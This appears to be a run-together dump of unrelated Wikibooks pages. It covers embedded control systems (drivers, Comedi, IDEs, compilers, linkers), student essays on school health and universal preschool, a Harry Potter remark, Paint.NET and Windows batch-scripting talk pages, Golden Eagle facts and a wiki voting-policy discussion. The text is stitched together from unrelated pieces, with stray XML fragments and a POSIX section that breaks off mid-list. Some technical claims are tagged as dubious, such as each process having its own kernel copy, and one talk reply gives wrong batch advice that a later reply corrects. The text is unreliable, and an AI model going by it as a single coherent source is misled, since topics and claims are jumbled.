**[[w:Interrupt|Interrupts]] vs. [[w:Polling (computer_science)|Polling]]: There is a difference between interrupt device drivers and polling device drivers. In Unix the kernel is not a separate task. Each part or process of the system has its own copy of the kernel{{fact}}. When the system gives a call to execute some task to a process, this is said to be &quot;in kernel mode&quot;. The process hasn't transferred control to another process. In kernel mode it is obvious where to place the data because the process is running in its own mode. When interrupts occur however, they will alter this dataplacement and may cause [http://www-uxsup.csx.cam.ac.uk/~dnb1002/Unix.html macro's]{{fact}} (which allow the system to access user-space memory) to write over random memory space of cause the kernel to crash. The driver has to schedule a interrupt and while doing that it must provide temporary space to put information in. In a block device driver this temporary space is arranged by the buffer. When using a character device driver, the device driver itself is responsible for the allocation.

*Complex device drivers: a normal device driver does nothing more than writing and reading a datastream to or from a peripheral device. When a device needs interrupts to communicate with the users software these drivers tend to be a little bit more complex. These kind of drivers are in need of a [http://msdn2.microsoft.com/en-us/library/ms795203.aspx ISR] and possibly also a DSR. There is also another reason why a device driver could become complex: some devices allow shared memory or even [[w:Direct_memory_access|Direct Memory Access]]. This means that no processor is used to exchange data. An operating system must support DMA. When designing a complex device driver it is best to standardize the structure and the API for the device:
**[[w:API|API]]: when a device offers similar mechanisms as other devices the designer has use the same software interface.
**Structure: The device driver must be able to cope with more layers of functionality of the interfaces.

*[http://www.comedi.org/ Comedi]:Data acquisition cards are used for measurements and control purposes. Comedi will provide a interface for them.It's a balance between modularity and complexity. Here are some issues that designers have to keep in mind when dealing with Comedi:
** It works on a standard Linux kernel as well on RTAI and RTLinux.
** It consists of two packages: [http://www.comedi.org/ Kcomedilib and Comedilib].
** The cards have the following features: 
***analog input/output channels.
***digital input/output channels.
** The kernel space structure uses a specific hierarchy:
***[http://www.comedi.org/doc/index.html#COMEDIDEVICES channel]: represents the properties of one single data channel.
***[http://www.comedi.org/doc/index.html#COMEDIDEVICES sub-device]: functionally identical channels.
***[http://www.comedi.org/doc/index.html#COMEDIDEVICES device]: set of subdevices. Thus the interface card itself.
** The basis functionalities are:
***[http://www.comedi.org/doc/index.html#ACQUISITIONTERMINOLOGY instruction]: synchronously perform one single data acquisition.
***[http://www.comedi.org/doc/index.html#ACQUISITIONTERMINOLOGY scan]: repeated instructions of a number of different cards.
***[http://www.comedi.org/doc/index.html#ACQUISITIONTERMINOLOGY command]: start or stop the data acquisition.
**It allows to query the capabilities of the installed Comedi devices.
**It offers event-driven functionality.
**It provides locking primitives when multiple devices are accessed at the same time.
Writing a comedi device driver and the different steps in the writing process are explained [http://www.comedi.org/doc/x1283.html here].

*Real-time serial line drivers: these kind of device drivers are integrated into RTAI. They provide:
** very configurable address initialization,
** interrupt handling,
** buffering, [[w:Callback_%28computer_science%29|callbacks]], non-intrusive buffer inspection,...

*Real-time parallel port drivers: these kind of drivers are integrated in Comedi. They allow the real-time interrupt handler to be connected to the interrupt on a parallel port.

*Real-time networking drivers: integrated in the RTAI, it provides a common programming interface between [[w:RTOS|RTOS]] and the device drivers of ethernet networks.

== POSIX==

When developing an operating systems, there is a wide range of advantages if the design is according to certain standards. Software is developed in teams, and standards make the design far easier, faster and more transparent. Standards increase the portability of existing applications to new hardware. They also facilitate the cooperation of different pieces of software. 

POSIX or &quot;Portable Operating System Interface&quot; is the collective name of a family of related standards specified by the IEEE to define the application programming interface (API) for software compatible with variants of the Unix operating system. POSIX specifies the user and software interfaces to the OS in some 15 different documents. For real-time systems, POSIX has the following standards:

This chapter introduces some software tools are available to support system
developers. Not only in the creation of the software to control their systems,
but during the complete [[Embedded_Control_Systems_Design/The design process|design process]], for hardware as well as software.


== Integrated development environment (IDE) ==

An [[w:Integrated Development Environment|Integrated Development
Environment]] (IDE) is software that assists programmers in developing
software (and only software!). IDEs normally consist of a [[#Editor|source code editor]], a
[[#Compiler|compiler]], a [[#Linker|linker/locater]] and usually a
[[#Debugger|debugger]]. Most often, various tools to simplify the
construction of the code are included as well, such as for example
[[#Version control|version control]] support, and integration with software
frameworks from which code can be reused. Sometimes, an IDE is devoted to one specific programming
language or one (family of) specific processor or hardware (for example,
the software with which you can program robots from one specific vendor),
but more often the IDEs support multiple languages, processors, etc. Some
commonly used IDEs for embedded systems are 
the [[w:GNU Compiler Collection|GNU compiler collection]] (gcc), 
[[w:Eclipse (software)|Eclipse]],
[[w:Borland Delphi|Delphi]],
[[w:Kylix programming tool|Kylix]], [[w:KDevelop|KDevelop]], [[w:Matlab|Matlab]], 
[[w:Microsoft Visual Studio|Microsoft Visual Studio]], [[w:Netbeans|Netbeans]],
[[w:Powerbuilder|Powerbuilder]], [[w:DevC++|DevC++]], [[w:JDeveloper|Jdeveloper]], [[w:IntelliJ|IntelliJ]], etc.

The industry (and not only the embedded systems industry!) is gravitating towards either the [[w:open source|open source]] Eclipse framework, or the [[w:proprietary|proprietary]] Visual Studio. The reason why only these two will most probably survive in the future is the effect of [[w:increasing returns|increasing returns]]: an IDE that offers already a lot of integration between component tools has an easier job attracting more users, and more users attract more further development opportunities. (This effect works irrespective of whether the tool is open source or not.) The ''embedded'' industry has made to a large extent the choice for Eclipse.


=== Editor === 
A source code editor is a text editor program designed specifically for editing source code to control embedded systems. It may be a standalone application or it may be built into an integrated development environment (e.g. IDE). Source code editors may have features specifically designed to simplify and speed up input of source code, such as syntax highlighting and auto complete functionality. These features ease the development of code.
Some commonly used editors for embedded systems are BBEdit (for Mac), Emacs (GNU), Kate (KDE), Microsoft Visual Studio (built-in editor) and Vi (vim)

=== Compiler ===
A compiler is a computer program that translates the source code into computer language (object code). Commonly the output has a form suitable for processing by other programs (e.g., a linker), but it may be a human-readable text file. A compiler translates source code from a high level language to a lower level language (e.g., assembly language or machine language). The most common reason for wanting to translate source code is to create a program that can be executed on a computer or on an embedded system. The compiler is called a cross compiler if the source code is compiled to run on a platform other than the one on which the cross compiler is run.
For embedded systems the compiler always runs on another platform, so a cross compiler is needed. A cross compiler is a tool that one must use for a platform where it is inconvenient or impossible to compile on that platform, like micro controllers that run with a minimal amount of memory for their own purpose. Since many embedded systems have limited resources, cross-compiling is very common.

A compiler is likely to perform many or all of the following operations: lexing, preprocessing, parsing, semantic analysis, code generation, and code optimizations.
Some commonly used compilers for embedded systems are GCC (GNU), Visual C/C++, CPPBuilder (Delphi/Kylix).

=== Linker ===
A linker or link editor is a program that takes one or more objects generated by compilers and assembles them into a single executable program or a library that can later be linked to in itself. All of the object files resulting from compiling must be combined in a special way before the program can be executed. The object files themselves are individually incomplete, most notably is that some of the internal variable and function references have not yet been resolved. The job of the linker is to combine these object files and, in the process, to resolve all of the unresolved symbols. 
Linkers can take objects from a collection called a library. Some linkers do not include the whole library in the output. They only include its symbols that are referenced from other object files or libraries. Libraries for diverse purposes exist, and one or more system libraries are usually linked in by default. Unfortunately, the standard library routines often require some changes before they can be used in an embedded program. The problem here is that the standard libraries provided with most software development tool suites arrive only in object form. So you only rarely have access to the library source code to make the necessary changes yourself. 
If you weren’t working on an embedded system, you’d be finished building your software. For embedded systems the program is complete except for one thing: no memory addresses have been assigned to the code and data. You’ll have to provide information about the memory on the target board as input to the locator. The locator uses this information to assign physical memory addresses to each of the code and data sections. It will produce an output file that contains a binary image that can be loaded into the target ROM. 
A commonly used linker/locater for embedded systems is &lt;tt&gt;ld&lt;/tt&gt; (GNU).

=== Debugger ===
A debugger is a computer program that is used to test and debug other programs. The code to be examined might alternatively be running on an instruction set simulator (ISS), a technique that allows great power in its ability to halt when specific conditions are encountered but which will typically be much slower than executing the code directly on the appropriate processor.
When the program crashes, the debugger shows the position in the original code if it is a source-level debugger or symbolic debugger, commonly seen in integrated development environments. If it is a low-level debugger or a machine-language debugger it shows the line in the disassembly.
Usually programmers use unit testers. These testers can test a minimal software component, or module. An emulator helps programmers test their software, it makes testing with hardware in the loop possible. An emulator simulates the systems that must be controlled by the embedded system. It is possible to use Standard Test Access Ports ([[w:JTAG|JTAG]]) to debug the software on the  embedded system. These standards defines a 5-pin serial protocol for accessing and controlling the signal-levels on the pins of a digital circuit, and has some extensions for testing the internal circuitry on the chip itself.
Some commonly used debug programs for embedded systems are GDB (GNU), Microsoft Visual Studio Debugger

Often programmers use bugdatabases. A bugdatabase-program makes it possible to database of all the bugs with their description. So colleagues can find information about bugs easily. They don’t have to waste time by searching a solution for a bug because others already solved it. Some bugdatabase-programs make it possible to discuss bugs with other engineers. A frequently used program is Bugzilla.

=== Version control === 
Version control is the management of multiple revisions of the same unit of information. It is most commonly used in engineering and software development to manage ongoing development of digital documents like application source code and other critical information that may be worked on by a team of people. Changes to these documents are identified by incrementing an associated number or letter code, termed the &quot;revision number&quot;, and associated historically with the person making the change.
Software tools for revision control are increasingly recognized as being necessary for almost all software development projects.
Nowadays, most products are assembled from several components. In order to know what version of each component was used to construct the assembly, all information needs to be kept in a detailed database. In the future, version control software should offer a feature to keep track of all versions of the components in a certain version of the assembly. This makes it easier to solve problems with a product on a later date.
Version control software currently used for embedded systems are for example Concurrent Version System (CVS), Subversion (A new version of CVS) and GNU arch.



==Model-Driven Engineering toolchains==
In the past there was a trend to integrate the different steps of the
software toolchain in one integrated development environment. This trend
continues, more and more features are added to IDEs. A trend for the
future is more integration of software development with 
[[w:Computer Aided Engineering|Computer Aided Engineering]] (CAE) analyses. For
example: developers of software have to adjust their software-code because
there are problems with the dynamic response of the system to control. In
the future, CAE models of dynamic response and FE analysis will be
inherently embedded into the design of the software.


===Modelling standards===
UML2, SysML, Marte, AADL,

===MDE projects===
Important MDE projects for embedded systems development are:
www.Topcased.org, www.openEmbedd.org, and www.papyrusuml.org; these
projects are cooperating towards more interoperability.

'''Introduction'''

This section discusses some important applications which contain embedded control systems. The aim is to describe each system by means of the structure, classifications and terminologies introduced in the previous chapters of this book. The different applications will be discussed according to the layout of this book:
* Requirements
* Design process
* Application-specific implementations

This chapter will not elaborate on the generic design processes, which have already been discussed in the other chapters. Each of the different sections will rather point out specific aspects that have to be taken into account in the design of the respective application, but might be less important in other designs. The different sections will also point out where these design criteria should be taken into account in a normal design process for these applications. 

The goal of this chapter is not to give an exhaustive overview of all the different embedded systems in the different applications, but merely to give an overview of the most important specific systems and demands.  There won’t be an overview off all the hard- and software components either, because valuable information on these can be found elsewhere …

The applications treated in this wikibook are:
* [[Embedded Control Systems Design/Robotics|Robotics]]: industrial robots, machine tools, [[w:Robocup|RoboCup]] soccer robots
* [[Embedded Control Systems Design/Automotive|Automotive]]: cars, trucks, trains
* [[Embedded Control Systems Design/Aviation|Aviation]]: airplanes, helicopters 
* [[Embedded Control Systems Design/Home and Building Automation|Home and Building Automation]]
* Aerospace: rockets, satellites
* Energy systems: windmills, nuclear plants
* Medical systems: prostheses, revalidation machines

:Hello Bruyninc, how are you? I haven't seen you or your students recently, I was wondering if you were ever going to return to work on this book. It is a good book, and an excellent example of a successful class project. I showed it to some professors at my school, and while it doesn't exactly fit into our curriculum, they were still very impressed by it.
:Anyway, that message above is automated, and there really isn't a problem. I think it gets triggered when people create very short pages. I'm sure that you're planning to write more on that page, so i'll remove the warning message from the page.

      <text xml:space="preserve">== '''School Role in Early Childhood Health''' ==
By Noel Bonanza

Students suffering from an economic disadvantage (i.e. homelessness, family suffering from financial difficulty, low-income housing riddled with environmental health hazards, etc.), schools have the power to play a crucial role in helping to meet the needs of these children.  To create a learning environment that is safe, happy, and healthy for all school age children, schools must implement policies and/or programs to address the following issues:  medical and preventative healthcare, mental healthcare, nutrition and food services, and physical education.   


'''Medical and Mental Preventative Healthcare'''

Many children suffer from ailments and emotional distress as a result of their immediate home environment.  “Homeless children are at much greater risk of illness, injury, malnourishment, abuse, neglect, violence, separation from family, delays in cognitive and language development, and impaired academic functioning than housed children” (Crowley, pg 23).  As a result of inadequate medical care many children frequently come to school sick or are absent, with the most common ailment being dental disease.  According to a recent article on oral health in America, more than 51 million school hours are lost each year due to dental related illnesses (Available Online at http://www.oralhealthamerica.org/news/022207.htm).  The most common dental health problem among school children is tooth decay, which can cause a great deal of pain and discomfort, thus inhibiting concentration in the classroom and leading to possible absence from school.  Free oral health screening and other preventative programs could be instituted in the schools to aid in the prevention of dental disease.  Perhaps the schools could recruit local dentistry practitioners to come into the schools to implement oral health screening and educate the children on the importance of tooth brushing.  As an added bonus each child could go home with a toothbrush and one of those miniature sized tubes of toothpaste.  To further improve oral health schools could institute other programs such as fluoride rinses, a type of solution to rinse away bacteria from the mouth.  “To be effective, interventions should be tailored to children's stages of dental development” (Available Online at www.nationalguidelines.org).  

“Early identification, assessment, and management of health problems” and potential problems “that affect a student's safety are necessary to limit more serious consequences and to prevent ill health from affecting the child's emotional well-being and ability to learn” (Available Online at www.nationalguidelines.org).  Free screenings for diseases and free vaccinations are also ways in which schools can take preventative measures to ensure the health and wellness of their children.  When I was in elementary and middle school, for example, my school did free screenings for vision, hearing, scoliosis, tuberculosis, and lice and offered free vaccinations for the measles, mumps, and rubella, as well as tetanus.  In recent years this list includes screening for mental health problems, substance abuse, asthma, type II diabetes, hypertension, obesity, and a host of other health issues (Available Online at www.nationalguidelines.org).  Parental consent was required to participate in all free health screenings, except when screening for lice, and all students not participating had to submit a form from their physicians as proof of having received the appropriate medical care required by the schools.  The school nurse and a member of the administration administered the vaccinations and screenings for all students allowed to participate. 
 

'''Nutrition and Food Services'''

It is also important that schools provide good nutrition and food services to students.  “School food services are designed to supplement families' efforts” (Available Online at www.nationalguidelines.org).  Families should also be made aware that food programs provided by the school offer financial assistance to low-income families.  They may receive information on these programs through school bulletins, the mail, open-houses, and parent-teacher associations.  A common problem that many students face in regards to receiving early morning breakfast; however, is the bus schedule.  One way to resolve the bus schedule conflict is to rearrange the bus schedule so students may participate in the breakfast program.  Buses could be scheduled for earlier pick-ups for those students participating in the program.  If rearranging the schedule is not feasible with the school system perhaps breakfast could be made available for students after the beginning of the school day.   In any case, teachers could provide nutritious snacks, such as apples or bananas, for those students who are in need.

The introduction of vending machines in the schools, which supply a sugary array of snack foods and drinks, has created a nutritional problem in schools.  More than half the food service workers surveyed by the American Federation of Teachers stated that students prefer foods high in fats and sugars over nutritional lunches.  Vending machines are not present in all schools; however, children can still obtain drinks and foods high in sugars in the dessert lines.  Not to mention, many students bringing their lunches and afternoon snacks with them are also packed with sodas and other sugary foods.  While schools cannot prevent what parents pack in lunches, they should be able to provide a healthy alternative for snacks.  When I was in Kindergarten, the school had a program which supplied all of our snack foods.  Instead of cookies, chips, and sodas we were given air-popped popcorn, raisins, apples, bananas, real fruit juices, and other nutritious foods.  More nutritious snack foods would help combat the growing problem of obesity, as would increased physical education.     


'''Physical Education'''

It is important for schools to maintain a physical education program for students.  Current research points out that physical activity reduces the occurrence of anxiety, depression and behavioral problems among young children.  It also reduces the likelihood of children becoming obese (Stegelin, pg 101).  Physical activity is extremely important as it leads to healthy hearts and bodies and helps fight obesity, which seems to be a growing problem in our nation.  In recent studies obesity has been linked to other serious diseases and emotional disorders such as diabetes, high blood pressure, heart disease, depression, and fear of rejection (Stegelin, pg 101).

For many children, television, video games, and a parents’ general fear of the outside world inhibit physical activity outside of the school environment.  For smaller children it would perhaps be a better idea to make physical education part of the curriculum every other day.  Having a recess program and sports programs such as t-ball and soccer every afternoon would also help children burn off energy gained at lunchtime.  Physical activity allows children to develop stronger muscles, fine tune their motor skills, and helps them increase their social and emotional confidence.

      <text xml:space="preserve">'''Universal Preschool'''

Written By: Kara Flake

A '''''Universal Preschool''''' gives the chance for all three to five year olds to attend a preschool and receive a free education, no matter their social status.  Children who receive preschool education are typically the children who come from wealthy families, those who can afford private schooling, or the children who are below the poverty line and meet the requirements for federally funded programs.

A. '''Who should pay for the universal preschool?'''

	Children who are just above the poverty line seem to be overlooked.  They still cannot afford to be sent to a preschool, but do not qualify for federally funded programs.  These children make-up a great deal of the population and deserve admittance into a high quality preschool program. The payments for a universal preschool should come from state governments, but should be greatly supplemented by federal funding.  They need to support this, for every child.

SIDE BAR :   &quot;The United States needs to fund universal preschool.&quot; - Wilson Greene

B.'''Benefits'''

	The benefits of a universal preschool are far larger than the costs and expenses state and federal governments would incur.  Not only will the children who are just above the poverty line be able to also attend, but the other children of all circumstances will be able to also.  This is a chance to give free education to all children, and which will benefit them in the long run.  Children from low and middle socio-economic backgrounds would be given a high quality education, where if there is not a universal preschool, they most likely will not.  Also, this would benefit handicapped children.  They would provide more options and schools better equipped to deal with their problems.  Research has shown that a high quality education given to a child before they turn five, results in significant long-term benefits for that child.  One of the greatest benefits of a quality preschool is that you are able to motivate and activate the child’s brain when it is growing and developing at it’s fastest.  These children who go through quality preschool programs are less likely to repeat a grade, need special education, or get into future trouble with the law system. 

1. '''Children with handicaps and disabilities'''

	The universal preschool would enable early detection of children’s learning disabilities.  This would allow schools, teachers, and parents a much better opportunity to identify and also to understand the student’s disability.  Overall, this will get the most out of the potential of students with disabilities.  By expanding state and federal funding to put into action universal preschools, we will expand the opportunities and possibilities for handicapped students to learn in the least restrictive area, which is also under the Handicapped Children Act.  Currently, many preschools focus on non-handicapped children, and therefore do not have sufficient funding or resources to care for handicapped children.
	

2. '''Children of low socio-economic backgrounds'''

	Children who come from low socio-economic backgrounds can greatly benefit from high quality preschool programs, as well as all children.  However, less than half of children in poverty attend preschool at ages three to four.  This puts these children at a disadvantage already, and they are unprepared when entering primary school.  


C. '''Where did the idea of a universal preschool begin?'''

	A free universal preschool for every child is the new education flag.  However, it is a very old idea that goes far back.  Going as far back as in ancient times in Athens when Plato prescribed his work as “The Laws”, he described it as a sanctuary for children, beginning at age three, in order to lead up to his scheme for state education.  This is the premise that defines early childhood education as the underpinning for future learning experiences and gathers many countries to advocate the universal preschool movement in their educational systems.  Throughout many nations, there is a general agreement that early childhood education is an investment for success all through the following school years and beyond into adulthood.


D. '''School Psychologists support Universal Preschool'''

	School Psychologists’ jobs were primarily to only work and provide services to young children in the early childhood program with special education needs.  However, that has changed.  Now their job calls for an expanded role, focusing on school readiness and the provision of services to all young children and their families in a prevention-oriented approach that is likely to get the most out of efforts to advance educational and social outcomes.  State initiatives have encouraged universal preschool, which &quot;refers to the goal of making available to families of all 3- and 4-year-olds a program of services that provides high quality education for children and helps to prepare them for a successful entry to kindergarten&quot;.  Children going from home to a school setting so suddenly, are very unprepared.  They need school readiness, which is what the universal preschools will offer.  With a high quality preschool education, research has shown that these children were less prone to retention, committing crimes, dropping-out, and so on.  They were more prepared for going into primary school, and even further in the future, they had shown more advances in education.  It has been shown that children have many diverse needs, which should all be met.  


E. '''The importance of a preschool for all children'''

	Why should all children have a free preschool education?  What is so important?  At such a young age, these children have not yet developed the ability to act with consideration and intention, nor are they able to learn on demand.  They need this when going into higher education.  It is a crucial time, and at this age is when they learn to do these things.  This is one of the many reasons preschool is so important for children and that every child should have the opportunity to be in a quality preschool program.  In preschool, they learn to go from reactive thinking, to being able to think before they actually act.  These quality preschool programs should include proper teacher qualifications and training, small class sizes and teacher-to-student ratios, stimulating and motivating curriculum, and services that support the child and their family.  The universal preschools will include this, along with so many other benefits that have been mentioned, for all the children.

'''''How do you feel a Universal Preschool program will help children?'''''


Sample Response:

	There are many children in the world whose parents/guardians cannot afford to send them to preschool.  Some may meet the requirements where they can be offered federal funding programs, but may not be aware of that.  Others are just above the poverty line where they do not meet the requirements and do not have any choices.  The universal preschool programs give you a choice. Even though you are supposed to offer a fair education to all children, it still does not happen.  This is a way to make it happen.  It is important to give children the opportunity to grow and develop during such a crucial age.  This is when their minds are growing and developing the fastest, and it is at these ages that we should help with that by giving them that education.  It also helps prepare and get them ready for going into primary school.  It makes the transition much easier than going straight from being at home to all of a sudden being in a classroom, being expected to do work and learn on demand.  Learning on demand comes during the preschool age, and in a preschool setting is where it is supposed to be enhanced and supported.  The benefits of preschool are amazing and research proves it.  Also, research has shown that children who go to a quality preschool are less likely to get held back a grade, commit future crimes, or need special education.

Umm, no she doesn't. Hermione in the book is petrified at the thought that she might affect the past by interfering; '''you must not be seen''' is the watchword here. She is utterly horrified that Harry has had the temerity to actually cast the Patronus that saved everyone; and she would not be so scared by it if she had already done the same thing to distract Lupin. This is another of the things that is different between the movie and the books, and in this case is rather illogical in the movie portrayal.

Express your feelings about Paint.NET and the Paint.NET Wikibook in this section!

This is how to create a comment:
==i luv Paint.NET!==
This is a comment.
It looks really cool.
Almost as cool as Paint.NET

== Great job! ==

This is going really well so far.  I tried the '''fire''' tutorial and was blown away (unintentional pun).  I also read how to make animated GIFs which is actually what I was looking for.  If you need encouragement to keep adding more chapters to the wikibook, consider this it.  

Great job so far.  

Thank you!

This is a very long page, I would rather have it in separate pages. I am going ahead and doing this.
Wish me luck. --[[User:Grich|Grich]] 02:05, 23 March 2007 (UTC)

I think think this page needs splitting up but to turn it into something other than a reiteration of &quot;documentation&quot; elsewhere I think it should be split it categories with good examples. The sections would something such as File Management, Control Flow, Presentation etc. I think more content should be added before doing this split. --[[User:Jason.Cozens|Jason Cozens]] 17:38, 6 December 2008 (UTC)

I have now added new chapters for this book. I haven't started editing (deleting or moving content) from the main page as I will do this as the chapters build up. The intention is to make the main page into an overview and add an introductory chapter (Chapter 1.). --[[User:Jason.Cozens|Jason Cozens]] 20:55, 30 December 2008 (UTC)

==Question==
'''NEWB''' says: Why doesn't recognize a file like '''file 1.doc'''
I typed in the right path ,and '''start '''file 1.doc'''''' but it won't load the doc.

:The reason is because batch files treat spaces as a new command. If you want to run file 1.doc, you must type &lt;tt&gt; START file_1.doc&lt;/tt&gt; with the underscore. --[[user:penubag|&lt;font color=
#00FFFF&gt;'''penubag'''&lt;/font&gt;]]'''  ([[w:user talk:penubag|&lt;font color=
#1E90FF&gt;talk]]; [[w:user:penubag|&lt;font color=
#EE82EE&gt;w]])&lt;/font&gt; 05:58, 17 July 2008 (UTC)

:@NEWB, &lt;font color=#00FFFF&gt;'''penubag'''&lt;/font&gt; is wrong. I have never seen ANY version of the Windows START command use an underscore to replace a space.
:Instead, simply surround the file-name with quotes like so:
: &lt;code&gt;'''START &quot;file 1.doc&quot;'''&lt;/code&gt;
:Actually, you don't even need the START command, you can launch the document by simply typing the name and extention inside a set of double quotes. Like this:
: &lt;code&gt;'''&quot;file 1.doc&quot;'''&lt;/code&gt;

== Add CMD to list of Commands - Commands to be covered. ==

Is it OK to add CMD into the list of commands between &lt;code&gt;CLS&lt;/code&gt; and &lt;code&gt;COLOR&lt;/code&gt;? --[[User:Jason.Cozens|Jason Cozens]] 09:00, 07 November 2008 (UTC)

I've seen that CMD is listed under external commands. Does there still want to be an entry in the main list of commands as for cmd.exe CMD comes up in the &gt;HELP list.
--[[User:Jason.Cozens|Jason Cozens]] 11:35, 11 November 2008 (UTC)

In order to make the initial version of this book tractable I'd like to concentrate on one set of commands and then add notes about other command interpreters later. I propose to start by covering the commands in Windows XP cmd.exe Version 5.1.2600 to start with. --[[User:Jason.Cozens|Jason Cozens]] 20:58, 30 December 2008 (UTC)

== Split This Book ==

This book definitely needs to be split into different sections.

Specifically this (no longer current) book needs to be dedicated to Windows built in Command Interpreter (as of Windos NT 4.0) CMD.EXE.

The other command interpreters central to this book (4NT [from JP Software] and CMD [from ReactOS]) should only be mentioned as add-ons or potential replacements for Microsoft's CMD.EXE.

Currently the verbiage used to identify which of the 3 is being referred to is haphazard. Additionally, CMD and ReactOS are used interchangeably, potentially confusing readers (like me) into thinking that MS CMD.EXE commands are being described when it's really ReactOS commands.

Also notations about which commands were new, available, changed, disappeared and reappeared through the different versions of Windows should be added. Possibly it might be wise to create separate books for DOS, Windows 9x, ME, NT, 2000, XP, Vista, 7, and 8.

In fact, I don't know why other Command Interpreters like FreeDOS and 4DOS should not also be mentioned, and given their own books.

Lastly, I believe that some of the explanations of the commands are FAR to in-depth, and would be more appropriately located on a Wikipedia page of their own. This book '''&lt;u&gt;should&lt;/u&gt;''' be more than just a list of commands, but I think a short explanation of the command, maybe simple examples of each 'Mode' of use. (Take the NET and FOR commands for example. FOR could include an example of &quot;for %%x (*.*) do&quot;, &quot;for /f&quot;, &quot;for /i&quot;, etc. But leave the page after page in-depth explanations of each command on *pedia. IMHO. Or at least until we have a better table of contents and overview of commands. Again, IMHO.

== Scope restriction ==

I have restricted the book to cmd.exe, as proposed at [[#Split This Book]] above on this talk page. Instead of planning to treat three separate command interpreters while treating none of them in any depth, the book should better focus on the most popular and most used command-line interpreter for MS Windows.

Here is [http://en.wikibooks.org/w/index.php?title=Guide_to_Windows_Commands&amp;diff=prev&amp;oldid=2400197 my scope-restricting edit].

Furthermore, I have removed any links to the following stubby subpages:
* [[Guide_to_Windows_Commands/Batch_File_Scripting]]
* [[Guide_to_Windows_Commands/Environment Commands]]
* [[Guide_to_Windows_Commands/File and Directory Management]]
* [[Guide_to_Windows_Commands/File Commands]]

I have renamed the book from &quot;Guide to Windows Commands&quot; to &quot;Windows Batch Scripting&quot;.

:: I ask you to leave &quot;Breaking into subpages&quot; thread alone. The subject heading [[#Reorganising this page]] captures the subject poorly, as does [[#Split This Book]]. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|discuss]] • [[Special:Contributions/Dan Polansky|contribs]]) 16:50, 26 June 2013 (UTC)
:: Advantages of a single page, for you:
::* Easier search using browser's Control + F function
::* No need to create and update a printed version page
::* Snapshotting of book development: a revision of a single page is a snapshot of a book in time. Creating a snapshot in time of a collection of pages is far from that straightforward.
:: Advantages of multiple pages:
::* Smaller occupation of wiki database storage, as edits are made to much smaller pages
::* Better focus for readers with attention deficit
::* Shorter loading times, but not much really, I think. Depends on the length of a book. For a book under 100 KB, the loading time difference seems negligible. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|discuss]] • [[Special:Contributions/Dan Polansky|contribs]]) 06:48, 13 July 2013 (UTC)
:::: Thanks! Control + F is a good argument, although wikipedia has a funktion to search within multipaged books. I suppose thats a personal choice. Not sure, why you would want to read an &quot;old version&quot; of the book, but that's true, a single page would make that easier. 
:::: For now I would agree with you and stick to the single page version as long as possible as well (and since we are the only ones who care... ;) Although I don't agree with starting the third thread about &quot;spliting the book&quot; (in addition to [[#Split This Book]] and [[#Breaking into subpages]]and . This makes a discussion quite hard! So I would either suggest we merge them or just delete the two old once (since they only have suggestions on how to do the split and weren't used for the past few years).

A pair of Golden Eagles remains together for life. They build several eyries within their territory and use them alternately for several years. The nest consists of heavy tree branches, upholstered with grass. 

Old eyries may be {{units|2 meters|6.6 ft}} in diameter and {{units|1 meter|3.3 ft}} in height, as the eagles enlarge their nests every year. If the eyrie is situated on a tree, supporting tree branches may break because of the weight of the nest.

The female lays two eggs between January and May (depending on the area). After 45 days the young hatch. They are entirely white and are fed for fifty days before they are able to make their first flight attempts and eat on their own. In most cases only the older chick, which takes most of the food, survives, while the younger one dies without leaving the eyrie.

Adult Golden Eagles have an average length of {{units|75-85 cm|30-34&quot;}}, a wingspan of {{units|150-210 cm|59-83&quot;}}, and a weight of {{units|3-5 kg|7-11 lb}}. As in all birds of prey, the females are generally slightly larger than the males. 

The plumage colors range from black-brown to dark brown, with a striking golden-buff crown and nape, which give the bird its name. The juveniles resemble the adults, but have a duller more mottled appearance. Also they have a white-banded tail and a white patch at the carpal joint, that gradually disappear with every moult until full adult plumage is reached in the fifth year.

Golden Eagles often have a division of labor while hunting: one partner drives the prey to its waiting partner. They have very good eyesight and can spot prey from a long distance. The talons are used for killing and carrying the prey, the beak is used only for eating. The talons of a Golden Eagle are thought to be more powerful than the hand and arm strength of any human being.

Under the proposed policy, there is a sentence with a missing word that is needed to properly understand the proposal.

&lt;blockquote&gt;''Any wikibookian with 20 bona fide or more is eligible to vote on any issue''&lt;/blockquote&gt;

20 bona fide or more '''what'''?  Thanks, [[User:Gentgeen|Gentgeen]] 01:01, 15 August 2006 (UTC)

:Good catch! the &quot;what&quot; in question should be &quot;contributions&quot;. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 02:18, 15 August 2006 (UTC)

Do we really, really, really need that for consensus? It's so arbitrary, and it's not as if anything gets done with consensus without discussing the merits of the arguments made anyway.
It just seems rather unwelcoming, especially since we're hopefully going to be having a lot more collaboration with wikiversity as things get going there.--[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 17:31, 16 August 2006 (UTC)
:The important part here is that it's for voting on IMPORTANT things. I don't see how a user with 5 or 10 edits can be familiar with the way we do things here, and while 20 seems somewhat arbitrary, making twenty good quality edits at least shows a genuine interest in becoming involved.
:Perhaps an exception could be made if the user's own contributions/status could be affected by the vote, such as a module they started coming up for VfD. There should also be provisions for allowing voting eligibility to be contested on a case-by-case basis, as someone could still have a hundred edits and not have contributed anything, or (as in the VfD case I just mentioned) might have a dozen edits on their project and should be able to defend it. [[User:Xerol|Xerol Oplan]] 04:17, 17 August 2006 (UTC)

A minimum good faith contribution count gives two main benefits. First, it offers some protection against sockpuppets. It won't necessarily stop a determined sockpuppet, but largely it is the weight of the argument, not numerical count that decides things, so stopping determined sockpuppets doesn't tend to be a big problem. Second, it allows us to correct newbies unfamiliar with our ways in a way that they shouldn't take personally. I would hope that should a newbie offer a good argument, or should a page contributed to by a newbie be under discussion, the newbie's comments and vote would not be removed.

The figure of 20 is, of course, arbitrary. It could be 25, 30, 50 or 100. But it's good to try to keep it low enough not to put new editors off contributing to our discussions, [[User:Jguk|Jguk]] 06:51, 17 August 2006 (UTC)

== More changes ==
